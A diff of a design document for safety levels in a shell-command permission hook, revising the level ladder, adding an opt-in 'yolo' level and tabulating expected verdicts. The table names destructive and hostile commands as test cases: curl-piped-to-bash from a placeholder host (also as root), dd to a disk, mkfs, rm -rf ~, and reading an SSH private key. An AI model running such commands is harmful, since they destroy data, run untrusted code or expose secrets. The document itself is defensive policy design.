@@ -1,9 +1,16 @@
 # Safety Levels — Stage 3 design
 
-Status: draft (2026-07-03). Stage 3 of the behavioral capability model
-(`behavioral-taxonomy-v1.1.md`, §4). Designs the concrete default levels as
-predicates over the 12 facets and measures them against today's behavior as an
-impact baseline (not a spec to reproduce). Not yet implemented.
+Status: draft (2026-07-03; level set revised 2026-07-07). Stage 3 of the behavioral
+capability model (`behavioral-taxonomy-v1.1.md`, §4). Designs the concrete default
+levels as predicates over the 12 facets and measures them against today's behavior as
+an impact baseline (not a spec to reproduce). Not yet implemented.
+
+> **Revised (2026-07-07, `…-refinements` §5–6, canon `v1.4` §4.3):** the level set is
+> now `inert ⊂ read-local ⊂ write-local ⊂ developer ⊂ yolo`, with `admin`/`infra` as
+> deny-by-default siblings. The **`ci`** level below is **retired** — it would never be
+> selected in a human-in-the-loop hook; its provenance-strictness became the opt-in
+> `pinned-provenance` *modifier*. **`yolo`** (§3.6) is the new opt-in top of the local
+> ladder. Read §3.5 as historical.
 
 ---
 
@@ -39,7 +46,9 @@ Two consequences:
 The default level should still be permissive enough for everyday work — this tool
 is used almost entirely by developers — so we keep **`developer`** as the default
 and shape it around a reasonable dev-box trust model, not around back-fitting the
-accident. Stage 3 ships **five levels**, not three.
+accident. Stage 3 ships a **finer partition** than the old three — the nesting ladder
+`inert ⊂ read-local ⊂ write-local ⊂ developer ⊂ yolo` plus the `admin`/`infra` siblings
+(see the top note for the revised set).
 
 ---
 
@@ -52,10 +61,11 @@ max-combine-with-deny-absorbing fold, since union-of-capabilities + all-admissib
 ≡ max-level + deny-wins).
 
 ```
-inert  ⊂  read-local  ⊂  write-local  ⊂  developer  ⊇  ci*
+inert  ⊂  read-local  ⊂  write-local  ⊂  developer  ⊂  yolo        (+ admin, infra siblings)
 ```
 
-`ci` is a *sibling* of `developer` (a re-tune, not a superset — see §4).
+(Revised set — see the top note. `yolo` is the opt-in loosest local level, §3.6; `ci`
+below is retired.)
 
 | level | one-line intent | closest today |
 |---|---|---|
@@ -63,7 +73,8 @@ inert  ⊂  read-local  ⊂  write-local  ⊂  developer  ⊇  ci*
 | `read-local` | observe local state; nothing leaves, nothing changes | old `SafeRead` |
 | `write-local` | + create/mutate ordinary local data, no downstream execution | part of old `SafeWrite` |
 | `developer` | + recognized supply-chain builds & outbound fetches on a dev box | the rest of old `SafeWrite` (the default) |
-| `ci` | developer, re-tuned for unattended pipelines | *(new)* |
+| `yolo` | + anything local short of the irrecoverable (opt-in) | *(new)* |
+| `ci` | ~~developer, re-tuned for unattended pipelines~~ — **retired** → `pinned-provenance` modifier | *(removed)* |
 
 ---
 
@@ -136,7 +147,7 @@ network.destination ≤ fixed           # tool-configured registries/remotes, no
 network.payload     ≤ fetches         # pull deps; NOT sends-host-data
 execution      ≤ network-sourced  WHEN  supply-chain = {
                    source   ∈ {public-registry, signed-repo, private-registry, vendored},
-                   pinning  ≥ version,          # lockfile/pinned; floating tags fail
+                   pinning  ≥ floating,         # NO pinning floor — floating installs OK (golden-set §5.3)
                    exec-surface ≤ build-script  # install-hook & build-script OK; not run-arbitrary
                  }
 authority      = user                  # sudo still escalates OUT of developer
@@ -144,20 +155,23 @@ flow policy    = { forbid low-integrity → exec,  forbid secret → outbound-se
 ```
 This is where most everyday invocations land. `cargo build`, `npm ci`,
 `go build`, `git fetch`, `git commit` admit here, each citing a named
-supply-chain fact. Developer is defined by the trust model, though — not by
-back-fitting today's allow-set — so an honest exclusion of something `SafeWrite`
-waved through (a floating-tag `pip install`, an arbitrary-URL fetch) is expected,
-not a regression. `curl https://$H/x | bash` **denies**: destination is arbitrary
-*and* the pipe is an integrity flow (untrusted→exec) the flow policy forbids —
-denied today too, now with a stated reason.
+supply-chain fact. Developer gates on **source and exec-surface, not pinning**: a
+floating `npm install left-pad` / `pip install requests` admits (golden-set §5.3 — the
+source is a recognized registry), while an **arbitrary-URL fetch** does not. The opt-in
+`pinned-provenance` modifier is what adds a pinning floor for users who want it. `curl
+https://$H/x | bash` **denies**: source is `unverified-url` *and* the pipe is an
+integrity flow (untrusted→exec) the flow policy forbids — denied today too, now with a
+stated reason.
 
-### 3.5 `ci`  (was `contained-mode`) — resolved
-> **Resolved** (`behavioral-taxonomy-refinements` §5, HP-1/HP-2): this fused two
-> independent axes. *Contained* is now the **isolation modifier** (a sandbox transform
-> on the profile, §3.2 — not a level). *Unattended* is the **`ci`** level below: a
-> **stricter** `developer` for pipelines. They compose — a containerized CI job is the
-> `ci` predicate over a sandbox-clamped profile. The clauses below are the unattended
-> half; author `ci` up from `write-local` (R27), since `extends` only loosens.
+### 3.5 `ci`  (was `contained-mode`) — retired
+> **Retired as a level** (`behavioral-taxonomy-refinements` §5, HP-1/HP-2). This fused
+> two independent axes; *both* resolved to **modifiers, not levels**. *Contained* → the
+> **isolation modifier** (a sandbox transform on the profile, §3.2). *Unattended* → the
+> opt-in **`pinned-provenance` modifier**: safe-chains is always human-in-the-loop, so a
+> stricter "unattended pipeline" *level* would never be selected — its one durable idea
+> (tighter provenance) is a preference knob dialed onto whatever level is active. The
+> clauses below are kept as the historical statement of that provenance-tightening; read
+> them as the modifier's content, not a level.
 
 Same operation/locus/persistence envelope as `developer` (pipelines build too),
 but the provenance and channel clauses tighten where an unattended run has no
@@ -172,17 +186,40 @@ isolation      credited                # if run in a confirmed sandbox, locus cl
 `ci` is not `⊂ developer` nor `⊃`: it forbids floating deps developer allows, and
 (with isolation credited) permits broader locus developer forbids. Hence a sibling.
 
+### 3.6 `yolo`  (opt-in loosest local level)
+The top of the *local* ladder, `developer ⊂ yolo`, opted into per-environment (the
+`admin`/`infra` trusted-config gate). Intent: "do anything to a machine I own or can
+throw away — `sudo`, `rm`, installs — short of the irrecoverable." It is the first level
+whose natural shape is **allow-almost-everything minus a few corners**, so it is the sole
+client of the level language's bounded, allow-only `deny` clause: a maximal *local* allow
+(any operation, up to `root`, `locus.local ≤ machine`, any scale, `remote ≤ fetch-only`,
+`destination ≤ arbitrary`, `payload ≤ fetches`) with five **catastrophe corners**
+subtracted —
+```
+deny  destroy ∧ irreversible ∧ scale ≥ machine-wide      # C1  mkfs, dd of=/dev/sda, rm -rf ~
+deny  (destroy|mutate) ∧ irreversible ∧ locus.local ≥ machine   # C1b overwrite a system path / whole fs
+deny  execute ∧ authority = root ∧ source = unverified-url      # C3  curl | sudo bash
+# C2 (device/kernel), C4 (remote mutation), C5 (secret→chat/external) fall out of scoping
+# the positive allow — they are simply never granted.
+```
+`deny` runs after the allow and can only *remove* capability (monotonic-downward), so it
+cannot forge a stricter level from a looser base — the R27 worry runs the other way.
+Full design + proptests in `…-refinements` §6. `yolo ⊃ developer` and `⊃ (admin ∩
+¬catastrophe)`; `infra` (remote mutation) stays outside it by C4.
+
 ---
 
-## 4. Why five, and the shape of the lattice
+## 4. Why not a single chain — the shape of the lattice
 
-The old three were a *chain* by construction (numeric `Ord`). The honest levels
-are only a *partial* order: `ci` and `developer` are incomparable. That is correct
-— "safe for an unattended pipeline" and "safe on a trusted dev box" are different
-trust models, not more/less of one thing. The predicate engine already supports
-this: a level is a region, and regions need not nest. The non-arbitrariness
-protocol (v1.1 §5) applies per level: each clause cites a discriminator, so
-`ci`'s `pinning ≥ hash-verified` carries its because-string, not a vibe.
+The old three were a *chain* by construction (numeric `Ord`). The honest levels are
+only a *partial* order: the local ladder `inert ⊂ read-local ⊂ write-local ⊂ developer
+⊂ yolo` nests, but `admin` (local root) and `infra` (remote cloud) are **siblings, mutually
+incomparable** — "safe to administer this box" and "safe to operate a cloud" are different
+trust models, not more/less of one thing (a laptop enables `admin` and never `infra`; a CI
+runner the reverse). The predicate engine already supports this: a level is a region, and
+regions need not nest. The non-arbitrariness protocol (v1.1 §5) applies per level: each
+clause cites a discriminator, so `admin`'s "no `device`/`kernel`" and `yolo`'s catastrophe
+`deny` clauses each carry their because-string, not a vibe.
 
 ---
 
@@ -195,7 +232,7 @@ not to freeze it.
 
 The golden-set (v1.1 §5, seeded by the pilot's 20 forms) grows into a table: each
 row is an invocation with its honest profile and its expected verdict under each
-of the five levels. We diff those verdicts against the current engine and classify
+level. We diff those verdicts against the current engine and classify
 every divergence:
 
 1. **`intended-tightening`** — `SafeWrite` over-admitted; the honest denial is
@@ -217,25 +254,36 @@ row. Until then, the golden-set is authored by hand from this spec and the curre
 
 ### 5.1 Worked rows (illustrative seed)
 
-| invocation | honest profile (abbrev) | inert | read-local | write-local | developer | ci |
+| invocation | honest profile (abbrev) | inert | read-local | write-local | developer | yolo |
 |---|---|:--:|:--:|:--:|:--:|:--:|
 | `node --version` | observe·process | ✓ | ✓ | ✓ | ✓ | ✓ |
 | `git status` | observe·worktree | ✗ | ✓ | ✓ | ✓ | ✓ |
-| `cat ~/.ssh/id_rsa` | observe·user·secret=reads | ✗ | ✗¹ | ✗ | ✗ | ✗ |
+| `cat ~/.ssh/id_rsa` | observe·user·secret=reads·→chat | ✗ | ✗¹ | ✗ | ✗ | ✗² |
 | `touch build/out` | create·worktree·data | ✗ | ✗ | ✓ | ✓ | ✓ |
-| `rm -rf ./node_modules` | destroy·worktree·unbounded | ✗ | ✗ | ✗² | ✓ | ✓ |
+| `rm -rf ./node_modules` | destroy·worktree·bounded·recoverable | ✗ | ✗ | ✗³ | ✓ | ✓ |
 | `git config core.pager x` | configure·reconfiguring | ✗ | ✗ | ✗ | ✓ | ✓ |
 | `curl https://api/health` | observe·outbound·fixed·fetch | ✗ | ✗ | ✗ | ✓ | ✓ |
 | `cargo build` | execute·net-sourced·build-script·pinned | ✗ | ✗ | ✗ | ✓ | ✓ |
-| `npm install left-pad` | execute·net-sourced·install-hook·floating | ✗ | ✗ | ✗ | ✓ | ✗³ |
-| `curl https://$H/x \| bash` | execute·arbitrary·integrity-flow | ✗ | ✗ | ✗ | ✗⁴ | ✗ |
-| `sudo make install` | privilege∘installing·machine | ✗ | ✗ | ✗ | ✗⁵ | ✗ |
+| `npm install left-pad` | execute·net-sourced·install-hook·floating | ✗ | ✗ | ✗ | ✓ | ✓⁴ |
+| `curl https://$H/x \| bash` | execute·arbitrary·integrity-flow·user | ✗ | ✗ | ✗ | ✗⁵ | ✓⁶ |
+| `sudo make install` | privilege∘installing·machine·local-source | ✗ | ✗ | ✗ | ✗⁷ | ✓⁸ |
+| `curl https://$H/x \| sudo bash` | execute·unverified-url·**root** | ✗ | ✗ | ✗ | ✗ | ✗⁹ |
+| `dd of=/dev/sda …` · `mkfs …` | destroy·device·irreversible | ✗ | ✗ | ✗ | ✗ | ✗¹⁰ |
+| `git push` | mutate·remote | ✗ | ✗ | ✗ | ·† | ✗¹¹ |
 
 ¹ `intended-tightening` — old SafeRead read key files; the honest denial is wanted.
-² `unbounded` scale + destroy; `developer` admits project-scoped cleanup.
-³ `ci` requires `pinning ≥ hash-verified`; a floating install fails.
-⁴ arbitrary destination + integrity flow — denied today and here.
-⁵ `authority = user` clause; `sudo` escapes every default level (as today).
+² C5: a secret whose output reaches the chat is denied even at `yolo` (HP-15).
+³ `bounded` worktree destroy waits for `developer`; `write-local` doesn't auto-delete.
+⁴ `yolo` allows floating installs — looser than `developer`, and not a catastrophe corner.
+⁵ arbitrary destination + integrity flow — denied at `developer` (and today).
+⁶ C-none: run as the *user* — `yolo` opts out of the integrity-flow forbid at user level
+  (that is the level's whole point). The root form (next row) stays denied.
+⁷ `authority = user` clause; `sudo` escapes `developer` (as today).
+⁸ `yolo` folds in `admin`'s root grants; the install code's source is the local project,
+  not an unverified URL (C3), so it runs.
+⁹ C3: unverified-URL code executed **as root** — denied even at `yolo`.
+¹⁰ C1/C2: irreversible device-level destruction — the catastrophe floor, never auto.
+¹¹ C4: leaves the machine — remote mutation is `infra`, outside `yolo`'s local license.
 
 ---
 
@@ -243,8 +291,10 @@ row. Until then, the golden-set is authored by hand from this spec and the curre
 - Pin `developer`'s recognized-registry list and the exact `pinning ≥ version`
   test per ecosystem (defer to the supply-chain sub-facet catalog, annex
   `delegation`).
-- Decide whether `ci` credits isolation by default or only on a confirmed sandbox
-  flag (leaning: only confirmed, per v1.1 §3.2 "containment is earned").
-- Whether `write-local` should permit `scale = bounded` destroy (row 5 shows the
-  tension: `rm ./file` vs `rm -rf ./dir`).
-- Grow the golden-set to full corpus coverage; wire it as a Stage-4 test fixture.
+- Confirm the exact boundary of `yolo`'s integrity-flow relaxation: user-level exec of
+  downloaded code is allowed (row 6), root-level is not (C3, row 9) — is that the whole
+  rule, or are there user-level cases (e.g. writing an auto-run hook) that should still ask?
+- Whether `write-local` should permit `scale = bounded` destroy (the `rm -rf ./node_modules`
+  row shows the tension: `rm ./file` vs `rm -rf ./dir`).
+- Golden-set is now full-corpus (§`…-golden-set`); remaining work is to **freeze** it and
+  wire it as a Stage-4 test fixture, including a `yolo` column.
